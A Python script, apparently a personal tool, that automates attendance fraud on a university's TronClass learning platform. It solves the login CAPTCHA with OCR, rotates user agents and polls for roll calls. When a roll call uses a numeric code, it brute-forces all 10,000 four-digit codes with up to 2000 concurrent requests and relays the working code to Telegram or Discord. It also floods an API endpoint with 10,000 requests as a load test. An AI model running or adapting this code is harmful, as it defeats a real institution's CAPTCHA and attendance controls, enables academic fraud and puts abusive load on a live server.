import aiohttp
import yaml
import asyncio
import time
import re
import json
import random
import string 
from datetime import datetime
from pathlib import Path
from sys import exit
from tqdm import tqdm
from tqdm.asyncio import tqdm_asyncio
from http.cookies import SimpleCookie
from PIL import Image
import pytesseract
import io

pytesseract.pytesseract.tesseract_cmd = r'C:\Program Files\Tesseract-OCR\tesseract.exe'
TRON = 'https://tronclass.ntou.edu.tw'
PATH = Path('log')
PATTERN = re.compile(r'(LT[^"]+)')
with open(Path(__file__).parent.parent / 'config.yaml', 'r', encoding='utf-8') as file:
    CONFIG = yaml.safe_load(file)

class LoginFaild(Exception):
    def __init__(self, message='Login failed!'):
        super().__init__(message)

def random_id() -> str:
    chars = string.ascii_letters + string.digits
    return ''.join(random.choices(chars, k=16))

def random_ua() -> str:
    ua_list = CONFIG['config']['user-agent']
    return random.choice(ua_list)

def log(path:Path, resp:tuple[str, int, dict], cnt:int = -1) -> bool:
    if not CONFIG['config']['enable_log']:
        return False

    try:
        data = {
            'request': resp[0],
            'status_code': resp[1],
            'body': resp[2]
        }
        path.parent.mkdir(parents=True, exist_ok=True)
        with open(path, 'a', encoding='utf-8') as file:
            file.write(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')} | {cnt}\n")
            file.write(json.dumps(data, ensure_ascii=False, indent=2))
            file.write('\n') 
    except Exception as e:
        print(e)
        return False
    return True

async def mes(text:str = 'test message'):
    text = f"{CONFIG['account']['user']}  \n" + text

    if CONFIG['notifications']['tg']['enable']:
        async with aiohttp.request(
            method= 'POST',
            url=f"https://api.telegram.org/{CONFIG['notifications']['tg']['key']}/sendMessage",
            data = {
                'chat_id': f"{CONFIG['notifications']['tg']['chat']}",
                'text': text
            }
        ) as resp:
            pass
    if CONFIG['notifications']['dc']['enable']:
        header = {
            'Authorization': f"Bot {CONFIG['notifications']['dc']['key']}",
            'Content-Type': 'application/json'
        }
        async with aiohttp.request(
            method='POST',
            url=f"https://discord.com/api/v10/channels/{CONFIG['notifications']['dc']['chat']}/messages",
            headers=header,
            json={
                "content": text
            }
        ) as resp:
            pass
    return

    

async def login(id:int = 0) -> SimpleCookie:
    for attempt in range(CONFIG['config']['retries']):
        try:
            async with aiohttp.ClientSession() as session:
                session.headers.update({'User-Agent': random_ua()})

                async with session.get(url=f'{TRON}/login?next=/user/index') as lt_page:
                    lt = PATTERN.search(await lt_page.text()).group(0)
                
                async with session.get(url='https://tccas.ntou.edu.tw/cas/captcha.jpg') as captcha_page:
                    byte = await captcha_page.read()
                    stream = io.BytesIO(byte)
                    captcha = Image.open(stream)
                    captcha = captcha.convert('L')
                    text = pytesseract.image_to_string(captcha, config='-c tessedit_char_whitelist=0123456789 --psm 8')
                    cap = re.sub(r'[^0-9]', '', text)

                data = {
                    'username': CONFIG['account']['user'],
                    'password': CONFIG['account']['passwd'],
                    'captcha': cap,
                    'lt': lt,
                    'execution': 'e1s1',
                    '_eventId': 'submit',
                    'submit': '登錄'
                }

                async with session.post(url=lt_page.url, data=data) as resp:
                    if 'forget-password' in await resp.text():
                        raise LoginFaild()
                    cookie = resp.cookies 
            return cookie

        except LoginFaild as e:
            if attempt < CONFIG['config']['retries']:

                print(f'login {id} | retry attempt {attempt}')
            else:
                print('Max retries reached! login failed')
                print('username or password may be incorrect\n' \
                'check password!\n')
                return None
        except Exception as e:
            print(f'login {id} | {e}')
            return None


# api endpoint ===================================================================================
async def re_visited(session:aiohttp.ClientSession) -> aiohttp.ClientResponse:
    resp = await session.get(f'{TRON}/api/user/recently-visited-courses')
    return resp

async def number(rcid: int):
    succeed = 0
    ralled = False
    semaphore = asyncio.Semaphore(2000)
    device = random_id()
    code = 'NA'
    tmp_log = []

    async def inner(try_code, session):
        if ralled:
            return

        nonlocal succeed, code
        async with semaphore:
            for _ in range(10):
                try:
                    async with session.put(
                        f'{TRON}/api/rollcall/{rcid}/answer_number_rollcall',
                        json={
                            'deviceId': device,
                            'numberCode': f'{try_code:04d}'
                        },
                    ) as resp:
                        if resp.status == 200:
                            code = f'{try_code:04d}'
                            print(code)
                            await mes(code)

                        elif resp.status == 400:
                            pass

                        tmp_log.append({
                            'data': (
                                str(resp.url),
                                resp.status,
                                await resp.json()
                            ),
                            'id': try_code
                        })

                        succeed += 1
                    break
                except Exception as e:
                    tmp_log.append({
                            'data': (
                                str(resp.url),
                                resp.status,
                                str(e) + await resp.text()
                            ),
                            'id': try_code
                        })
                    await asyncio.sleep(5)
        return

    timediff = time.perf_counter()
    async with aiohttp.ClientSession() as session:
        session.cookie_jar.update_cookies(await login())
        tasks = [inner(i, session) for i in range(10000)]
        await tqdm_asyncio.gather(*tasks, desc=f'brute-forcing with {rcid}')
    timediff = time.perf_counter()-timediff

    path = PATH/'num'/f'{rcid}.log'
    for i in tqdm(tmp_log, desc='saving log file'):
        log(path, i['data'], i['id'])
    log(path, (
        'summary',
        'code',
        dict(
            spend_time = timediff,
            succeed_cnt = succeed,
        )
    ))

    text = (
        f'Total time: {timediff}  \n'
        f'Total request: {succeed}/{10000}  \n'
        f'Code: {code}\n'
    )
    print(text)
    await mes(text)
    return

async def check_rollcall(session: aiohttp.ClientSession, cnt:int = -1) -> int:
    async with session.get(f'{TRON}/api/radar/rollcalls?api_version=1.1.0') as resp:
        json: dict = await resp.json(encoding='utf-8')
        today = datetime.now()
        y = str(today.year)
        m = str(today.month)
        d = str(today.day)
        log(PATH/y/m/f'{d}.log', (str(resp.url), resp.status, json), cnt)

        if json.get('rollcalls'):
            rollcall: dict = json['rollcalls'][0]
            if rollcall.get('status') == 'on_call_fine':
                print('rollcalled')
                status = 0

            elif rollcall.get('is_number'):
                id = rollcall.get('rollcall_id')
                text = f'start num\n  id:{id}'
                print(text)
                await mes(text)
                await number(id)
                status = 1

            elif rollcall.get('is_radar'):
                print('start loc')
                status = 2
            else:
                print('maybe qrcode')
                status = 3
        else:
            print('not call')        
            status = -1
    return status



#  check env ===========================================================
async def checkpw():
    async with aiohttp.ClientSession(headers={
        'User-Agent': random_ua()
    }) as session:
        async with session.get('https://api.ipify.org') as resp:
            ip = await resp.text()

        async with session.get(url=f'{TRON}/login?next=/user/index') as page:
            lt = PATTERN.search(await page.text()).group(0)
    
        for attempt in range(CONFIG['config']['retries']):
            try:
                async with session.get(url='https://tccas.ntou.edu.tw/cas/captcha.jpg') as captcha_page:
                    byte = await captcha_page.read()
                    stream = io.BytesIO(byte)
                    captcha = Image.open(stream)
                    captcha = captcha.convert('L')
                    text = pytesseract.image_to_string(captcha, config='-c tessedit_char_whitelist=0123456789 --psm 8')
                    cap = re.sub(r'[^0-9]', '', text)
            
                async with session.post(url=page.url, data={
                    'username': CONFIG['account']['user'],
                    'password': CONFIG['account']['passwd'],
                    'captcha': cap,
                    'lt': lt,
                    'execution': 'e1s1',
                    '_eventId': 'submit',
                    'submit': '登錄'
                }) as resp:
                    if 'forget-password' in await resp.text():
                        raise LoginFaild()
                    ua = resp.request_info.headers.get('User-Agent')


            except LoginFaild as e:
                if attempt < CONFIG['config']['retries']:
                    text = (

                        f'check login error on {attempt}\n  '
                    )
                    print(text)
                    await mes(text)
                else:
                    text = (
                        f'username or password may be incorrect\n  '
                        f'check password!'
                    )
                    print(text)
                    await mes(text)
                    exit()
            except Exception as e:
                print(e)
    text = (
        f'{ua}  \n'
        f'login succeed\nuser: {CONFIG["account"]["user"]}  \n'
        f'ip: {ip}'
    )
    print(text)
    await mes(text)
    return

async def qps(count:int = 10000):
    semaphore = asyncio.Semaphore(2000)
    path = PATH/'qps'/f'{datetime.now().strftime("%Y-%m-%d_%H-%M-%S")}.log'
    succeed = 0
    tmp_log = []
                
    async def inner(id):
        nonlocal succeed, tmp_log
        async with semaphore:
            for _ in range(5):
                try:
                    async with session.get(
                        f'{TRON}/api/user/recently-visited-courses',
                    ) as resp:
                        data = (
                            str(resp.url),
                            resp.status,
                            await resp.text()
                        )
                        tmp_log.append({
                            'data': data,
                            'id': id
                        })
                        succeed += 1
                except Exception as e:
                    print(e)
                break
        return

    timediff = time.perf_counter()
    async with aiohttp.ClientSession() as session:
        session.cookie_jar.update_cookies(await login())
        tasks = [inner(i) for i in range(count)]
        await tqdm_asyncio.gather(*tasks, desc='testing queries per second')
    timediff = time.perf_counter()-timediff

    for i in tqdm(tmp_log, desc='saving log file'):
        log(path, i['data'], i['id'])

    text = (
        f'Total time: {timediff}  \n'
        f'Total request: {succeed}/{count}  \n'
        f'Success rates: {(succeed/count):.2%}  \n'
        f'QPS: {(count/timediff)}  \n'
        f'file locatoin: {path}  \n'
    )
    print(text)
    await mes(text)
    return

async def qps_num(id:int = -1):
    await number(id)
    return

cnt = 0
async def main():
    global cnt
    flag_day_night = False
    async with aiohttp.ClientSession() as session:
        session.cookie_jar.update_cookies(await login())
        error_cnt = 0
        while True:
            print(cnt, end=' ')
            
            today = datetime.today().weekday()
            schedule = CONFIG['operating'][today]
            range_str = schedule['range']
            start, end = [datetime.strptime(t, "%H:%M").time() for t in range_str]
            current_time = datetime.now().time()

            if not schedule['enable']:
                print('off working day\n')
                time.sleep(3600)
                continue
            else:
                if start <= current_time <= end:
                    if not flag_day_night:
                        flag_day_night = True
                        text = "starting working...  \n"
                        print(text)
                        await mes(text)
                    pass
                else:
                    if flag_day_night:
                        flag_day_night = False
                        text = "sleeping...  \n"
                        print(text)
                        await mes(text)
                    print('off working time\n')
                    time.sleep(300)
                    continue

            try:
                await check_rollcall(session, cnt)
            except Exception as e:
                if error_cnt < CONFIG['config']['retries']:
                    text = (
                        f'{CONFIG["account"]["user"]}:  \n'
                        f'check rollcall error on {cnt}  \n'
                        f'trying {error_cnt} times  \n'
                        f'error message: {e}'
                    )
                    print(text)
                    await mes(text)
                    error_cnt = error_cnt+1
                else:
                    break

            cnt = cnt+1
            time.sleep(CONFIG['config']['Senkaku'])

        



if __name__ == "__main__":
    asyncio.run(checkpw())
    asyncio.run(qps_num())
    while True:
        try:
            asyncio.run(main())
        except Exception as e:
            text = (
                f'fatal error on {cnt}  \n'
                f'trying...  \n'
                f'{e}'
            )
            print(text)
            asyncio.run(mes(text))            
